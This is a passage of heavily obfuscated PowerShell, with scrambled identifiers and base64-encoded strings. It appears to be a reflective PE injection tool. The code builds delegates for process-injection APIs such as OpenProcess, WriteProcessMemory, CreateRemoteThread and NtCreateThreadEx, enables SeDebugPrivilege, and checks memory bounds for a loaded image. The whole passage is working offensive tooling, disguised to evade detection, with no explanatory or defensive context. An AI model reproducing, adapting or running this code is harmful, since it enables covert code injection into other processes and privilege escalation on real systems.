		${__/\____/\_/\/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\/\/==\__/==}, ${_/====\/\/\_/===\})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name VirtualFreeEx -Value ${__/\____/\_/\/\/\}
		${_/=\_/=\/=\/\__/\} = ____/==\____/\__/= kernel32.dll VirtualProtect
		${/=\_/\/\/\/\__/=\} = _/==\/====\_/=\_/\ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${_/\/\/\_/\_/\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\_/=\/=\/\__/\}, ${/=\_/\/\/\/\__/=\})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name VirtualProtect -Value ${_/\/\/\_/\_/\____}
		${_/\_/\_/=\____/==} = ____/==\____/\__/= kernel32.dll GetModuleHandleA
		${/==\/===\/\__/==\} = _/==\/====\_/=\_/\ @([String]) ([IntPtr])
		${__/==\/\/==\/=\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\_/=\____/==}, ${/==\/===\/\__/==\})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name GetModuleHandle -Value ${__/==\/\/==\/=\_/}
		${/\______/=\/\/\__} = ____/==\____/\__/= kernel32.dll FreeLibrary
		${/=\_/==\/\__/=\/\} = _/==\/====\_/=\_/\ @([Bool]) ([IntPtr])
		${___/\_/\_/\__/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/\______/=\/\/\__}, ${/=\_/==\/\__/=\/\})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${___/\_/\_/\__/\/\}
		${/==\__/=\/==\/\_/} = ____/==\____/\__/= kernel32.dll OpenProcess
	    ${________/\/=\/\/\} = _/==\/====\_/=\_/\ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${__/==\/\_/=\/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\__/=\/==\/\_/}, ${________/\/=\/\/\})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${__/==\/\_/=\/\_/=}
		${______/=\_/\__/\_} = ____/==\____/\__/= kernel32.dll WaitForSingleObject
	    ${/=\/\_/\____/\/==} = _/==\/====\_/=\_/\ @([IntPtr], [UInt32]) ([UInt32])
	    ${__/=\/=\/\___/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/=\_/\__/\_}, ${/=\/\_/\____/\/==})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${__/=\/=\/\___/===}
		${/=\/\/\/==\/=====} = ____/==\____/\__/= kernel32.dll WriteProcessMemory
        ${/\______/\/======} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_____/\/=\___/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\/\/==\/=====}, ${/\______/\/======})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${_____/\/=\___/=\/}
		${/=====\__/\__/=\_} = ____/==\____/\__/= kernel32.dll ReadProcessMemory
        ${__/\/\__/\/\_/\/=} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${/===\/\/\_/=\_/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=====\__/\__/=\_}, ${__/\/\__/\/\_/\/=})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${/===\/\/\_/=\_/=\}
		${__/===\/=\_/=====} = ____/==\____/\__/= kernel32.dll CreateRemoteThread
        ${_/==\_/=\_/==\_/=} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${_/=\_/\/\/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/===\/=\_/=====}, ${_/==\_/=\_/==\_/=})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${_/=\_/\/\/=\_/=\/}
		${_______________/\} = ____/==\____/\__/= kernel32.dll GetExitCodeThread
        ${_/=\_/\/=\/=\_/\_} = _/==\/====\_/=\_/\ @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${/==\_/===\/\____/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_______________/\}, ${_/=\_/\/=\/=\_/\_})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${/==\_/===\/\____/}
		${__/==\/\/=\__/=\_} = ____/==\____/\__/= Advapi32.dll OpenThreadToken
        ${_/\_/\_/=\_/\/=\_} = _/==\/====\_/=\_/\ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${/====\_/\_/\_____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/==\/\/=\__/=\_}, ${_/\_/\_/=\_/\/=\_})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${/====\_/\_/\_____}
		${__/=\/======\/==\} = ____/==\____/\__/= kernel32.dll GetCurrentThread
        ${/=\/=\/=\____/\_/} = _/==\/====\_/=\_/\ @() ([IntPtr])
        ${/=\_/====\/\_/=\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/======\/==\}, ${/=\/=\/=\____/\_/})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${/=\_/====\/\_/=\_}
		${___/=\___/===\__/} = ____/==\____/\__/= Advapi32.dll AdjustTokenPrivileges
        ${____/\_/=\_/\/\/=} = _/==\/====\_/=\_/\ @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${/===\/=\/\_/===\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\___/===\__/}, ${____/\_/=\_/\/\/=})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${/===\/=\/\_/===\/}
		${______/\/\/\/====} = ____/==\____/\__/= Advapi32.dll LookupPrivilegeValueA
        ${_/\/\/\_/\/=\/=\/} = _/==\/====\_/=\_/\ @([String], [String], [IntPtr]) ([Bool])
        ${_/====\_/=\__/=\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/\/\/\/====}, ${_/\/\/\_/\/=\/=\/})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${_/====\_/=\__/=\_}
		${__/=\/==\/\/\/\/\} = ____/==\____/\__/= Advapi32.dll ImpersonateSelf
        ${_/=\_____/\___/==} = _/==\/====\_/=\_/\ @([Int32]) ([Bool])
        ${__/=\_/====\/=\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/==\/\/\/\/\}, ${_/=\_____/\___/==})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${__/=\_/====\/=\_/}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${/======\_/======\} = ____/==\____/\__/= NtDll.dll NtCreateThreadEx
            ${____/===\__/=\/\_} = _/==\/====\_/=\_/\ @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${____/==\/=====\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/======\_/======\}, ${____/===\__/=\/\_})
		    ${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${____/==\/=====\/=}
        }
		${/==\/=========\/=} = ____/==\____/\__/= Kernel32.dll IsWow64Process
        ${_/\/====\_/==\/==} = _/==\/====\_/=\_/\ @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${____/==\_/\_/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=========\/=}, ${_/\/====\_/==\/==})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${____/==\_/\_/\__/}
		${___/=\_/==\__/\_/} = ____/==\____/\__/= Kernel32.dll CreateThread
        ${__/\/=\/==\_/\/\/} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${_/==\/=\/=====\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\_/==\__/\_/}, ${__/\/=\/==\_/\/\/})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${_/==\/=\/=====\/=}
		${_/\_/\_/==\/====\} = ____/==\____/\__/= kernel32.dll VirtualFree
		${_/==\/\/\___/==\_} = _/==\/====\_/=\_/\ @([IntPtr])
		${/=\_/===\_/=\__/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\_/==\/====\}, ${_/==\/\/\___/==\_})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name LocalFree -Value ${/=\_/===\_/=\__/\}
		return ${_/=\/\/\/\____/\/=}
	}
	Function __/=\/=\__/\/=====
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=\/\_/\/===\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/===\___/=\_/\_/}
		)
		[Byte[]]${_/\___/=\______/\} = [BitConverter]::GetBytes(${__/\/=\/\_/\/===\/})
		[Byte[]]${_/=\/=\_/=\___/==} = [BitConverter]::GetBytes(${__/===\___/=\_/\_/})
		[Byte[]]${_____/===\__/\/=\} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\___/=\______/\}.Count -eq ${_/=\/=\_/=\___/==}.Count)
		{
			${_/=\/==\/\______/} = 0
			for (${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${_/\___/=\______/\}.Count; ${__/\_/=\/\/\_/=\_}++)
			{
				${_/=\/\_____/=====} = ${_/\___/=\______/\}[${__/\_/=\/\/\_/=\_}] - ${_/=\/==\/\______/}
				if (${_/=\/\_____/=====} -lt ${_/=\/=\_/=\___/==}[${__/\_/=\/\/\_/=\_}])
				{
					${_/=\/\_____/=====} += 256
					${_/=\/==\/\______/} = 1
				}
				else
				{
					${_/=\/==\/\______/} = 0
				}
				[UInt16]${___/\/==\_/=\_/=\} = ${_/=\/\_____/=====} - ${_/=\/=\_/=\___/==}[${__/\_/=\/\/\_/=\_}]
				${_____/===\__/\/=\}[${__/\_/=\/\/\_/=\_}] = ${___/\/==\_/=\_/=\} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${_____/===\__/\/=\}, 0)
	}
	Function _/===\/==\/======\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=\/\_/\/===\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/===\___/=\_/\_/}
		)
		[Byte[]]${_/\___/=\______/\} = [BitConverter]::GetBytes(${__/\/=\/\_/\/===\/})
		[Byte[]]${_/=\/=\_/=\___/==} = [BitConverter]::GetBytes(${__/===\___/=\_/\_/})
		[Byte[]]${_____/===\__/\/=\} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\___/=\______/\}.Count -eq ${_/=\/=\_/=\___/==}.Count)
		{
			${_/=\/==\/\______/} = 0
			for (${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${_/\___/=\______/\}.Count; ${__/\_/=\/\/\_/=\_}++)
			{
				[UInt16]${___/\/==\_/=\_/=\} = ${_/\___/=\______/\}[${__/\_/=\/\/\_/=\_}] + ${_/=\/=\_/=\___/==}[${__/\_/=\/\/\_/=\_}] + ${_/=\/==\/\______/}
				${_____/===\__/\/=\}[${__/\_/=\/\/\_/=\_}] = ${___/\/==\_/=\_/=\} -band 0x00FF
				if ((${___/\/==\_/=\_/=\} -band 0xFF00) -eq 0x100)
				{
					${_/=\/==\/\______/} = 1
				}
				else
				{
					${_/=\/==\/\______/} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${_____/===\__/\/=\}, 0)
	}
	Function ___/\/=\____/\/\_/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=\/\_/\/===\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/===\___/=\_/\_/}
		)
		[Byte[]]${_/\___/=\______/\} = [BitConverter]::GetBytes(${__/\/=\/\_/\/===\/})
		[Byte[]]${_/=\/=\_/=\___/==} = [BitConverter]::GetBytes(${__/===\___/=\_/\_/})
		if (${_/\___/=\______/\}.Count -eq ${_/=\/=\_/=\___/==}.Count)
		{
			for (${__/\_/=\/\/\_/=\_} = ${_/\___/=\______/\}.Count-1; ${__/\_/=\/\/\_/=\_} -ge 0; ${__/\_/=\/\/\_/=\_}--)
			{
				if (${_/\___/=\______/\}[${__/\_/=\/\/\_/=\_}] -gt ${_/=\/=\_/=\___/==}[${__/\_/=\/\/\_/=\_}])
				{
					return $true
				}
				elseif (${_/\___/=\______/\}[${__/\_/=\/\/\_/=\_}] -lt ${_/=\/=\_/=\___/==}[${__/\_/=\/\/\_/=\_}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function ___/=\/==\_/======
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		${_/=\_/\/==\/\/=\/\}
		)
		[Byte[]]${/==\_/\_/\/\__/\_} = [BitConverter]::GetBytes(${_/=\_/\/==\/\/=\/\})
		return ([BitConverter]::ToInt64(${/==\_/\_/\/\__/\_}, 0))
	}
	Function ____/\__/\_/\/=\/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${__/=\/\/=\___/\___},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\/==\_/\/==\/\/},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${_/=\_/==\/====\/=\}
		)
	    [IntPtr]${__/==\_/\/==\/\/=} = [IntPtr](_/===\/==\/======\ (${__/\/==\_/\/==\/\/}) (${_/=\_/==\/====\/=\}))
		${_/\/=\/=\______/\} = ${_/=\/====\/\/==\_/}.EndAddress
		if ((___/\/=\____/\/\_/ (${_/=\/====\/\/==\_/}.PEHandle) (${__/\/==\_/\/==\/\/})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAC8APQBcAC8AXAAvAD0AXABfAF8AXwAvAFwAXwBfAF8AfQA=')))
		}
		if ((___/\/=\____/\/\_/ (${__/==\_/\/==\/\/=}) (${_/\/=\/=\______/\})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAC8APQBcAC8AXAAvAD0AXABfAF8AXwAvAFwAXwBfAF8AfQA=')))
		}
	}
	Function ______/\____/\/=\/
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${___/=====\/====\/\},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${___/==\__/\_/=\__/}
		)
		for (${__/\_/====\/\_/\_} = 0; ${__/\_/====\/\_/\_} -lt ${___/=====\/====\/\}.Length; ${__/\_/====\/\_/\_}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${___/==\__/\_/=\__/}, ${__/\_/====\/\_/\_}, ${___/=====\/====\/\}[${__/\_/====\/\_/\_}])
		}
	}
	Function _/==\/====\_/=\_/\
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${___________/=\_/\_} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${_/=\/\____/=\_/\_/} = [Void]
	    )
	    ${_/====\/=\_/==\_/} = [AppDomain]::CurrentDomain
	    ${_/\/\/\/=\__/===\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${_/=\_/\/\/=\__/==} = ${_/====\/=\_/==\_/}.DefineDynamicAssembly(${_/\/\/\/=\__/===\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${___/\_/=\_____/==} = ${_/=\_/\/\/=\__/==}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${_/===\/\/\/\_/=\_} = ${_/\__/=\/\_/=\/\/}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${___________/=\_/\_})
	    ${_/===\/\/\/\_/=\_}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${/=\/=\/\_/====\/\} = ${_/\__/=\/\_/=\/\/}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_/=\/\____/=\_/\_/}, ${___________/=\_/\_})
	    ${/=\/=\/\_/====\/\}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${_/\__/=\/\_/=\/\/}.CreateType()
	}
	Function ____/==\____/\__/=
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_____/==\__/===\/\},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${_/=\/\/\_/=\/\_/==}
	    )
	    ${/==\_/\/====\/\/=} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${/======\___/=\/=\} = ${/==\_/\/====\/\/=}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${__/==\/\/==\/=\_/} = ${/======\___/=\/=\}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${____/=\___/==\__/} = ${/======\___/=\/=\}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${_/\/=\_/\/=\/\___} = ${__/==\/\/==\/=\_/}.Invoke($null, @(${_____/==\__/===\/\}))
	    ${_/\_/\____/\___/\} = New-Object IntPtr
	    ${_/=\__/=\__/\/===} = New-Object System.Runtime.InteropServices.HandleRef(${_/\_/\____/\___/\}, ${_/\/=\_/\/=\/\___})
	    echo ${____/=\___/==\__/}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${_/=\__/=\__/\/===}, ${_/=\/\/\_/=\/\_/==}))
	}
	Function __/=\/==\__/\__/\_
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/}
		)
		[IntPtr]${_/\/===\/\/\_/=\/} = ${_/=\/\/\/\____/\/=}.GetCurrentThread.Invoke()
		if (${_/\/===\/\/\_/=\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${_/\/\_/\__/==\/\/} = [IntPtr]::Zero
		[Bool]${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.OpenThreadToken.Invoke(${_/\/===\/\/\_/=\/}, ${_____/\__/\/\/\/\/}.TOKEN_QUERY -bor ${_____/\__/\/\/\/\/}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${_/\/\_/\__/==\/\/})
		if (${/===\/==\_/\/\/\_} -eq $false)
		{
			${/=\__/\/\/=\_/\/\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${/=\__/\/\/=\_/\/\} -eq ${_____/\__/\/\/\/\/}.ERROR_NO_TOKEN)
			{
				${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.ImpersonateSelf.Invoke(3)
				if (${/===\/==\_/\/\/\_} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.OpenThreadToken.Invoke(${_/\/===\/\/\_/=\/}, ${_____/\__/\/\/\/\/}.TOKEN_QUERY -bor ${_____/\__/\/\/\/\/}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${_/\/\_/\__/==\/\/})
				if (${/===\/==\_/\/\/\_} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8APQBcAF8AXwAvAFwALwBcAC8APQBcAF8ALwBcAC8AXAB9AA==')))
			}
		}
		[IntPtr]${___/==\/=\/\_/=\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.LUID))
		${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${___/==\/=\/\_/=\/})
		if (${/===\/==\_/\/\/\_} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${/=\____/\/===\/=\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.TOKEN_PRIVILEGES)
		[IntPtr]${__/\/==\/===\_/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\____/\/===\/=\})
		${_/\/\______/=\/\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/==\/===\_/=\}, [Type]${_____/=\_____/\__/}.TOKEN_PRIVILEGES)
		${_/\/\______/=\/\_}.PrivilegeCount = 1
		${_/\/\______/=\/\_}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/==\/=\/\_/=\/}, [Type]${_____/=\_____/\__/}.LUID)
		${_/\/\______/=\/\_}.Privileges.Attributes = ${_____/\__/\/\/\/\/}.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/\______/=\/\_}, ${__/\/==\/===\_/=\}, $true)
		${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.AdjustTokenPrivileges.Invoke(${_/\/\_/\__/==\/\/}, $false, ${__/\/==\/===\_/=\}, ${/=\____/\/===\/=\}, [IntPtr]::Zero, [IntPtr]::Zero)
		${/=\__/\/\/=\_/\/\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${/===\/==\_/\/\/\_} -eq $false) -or (${/=\__/\/\/=\_/\/\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/\/==\/===\_/=\})
	}
	Function _/==\/==\__/\_____
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${__/=\/\/=\__/\/==\},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\/==\_/\/==\/\/},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${___/=\____/\/\/\/=} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=}
		)
		[IntPtr]${__/=\_/=====\/==\} = [IntPtr]::Zero
		${_/\/\___/\/\/=\_/} = [Environment]::OSVersion.Version
		if ((${_/\/\___/\/\/=\_/} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${_/\/\___/\/\/=\_/} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
